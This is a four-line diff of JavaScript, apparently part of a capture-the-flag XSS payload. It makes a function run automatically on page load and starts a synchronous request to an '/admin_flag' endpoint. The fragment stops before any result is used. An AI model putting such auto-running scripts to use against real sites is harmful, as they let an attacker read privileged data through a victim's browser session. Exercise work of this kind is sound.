@@ -1,4 +1,4 @@
-window.f = function() {
+window.onload = function() {
         var flag = '';
         var xhr = new XMLHttpRequest();
         xhr.open('GET', '/admin_flag', false);
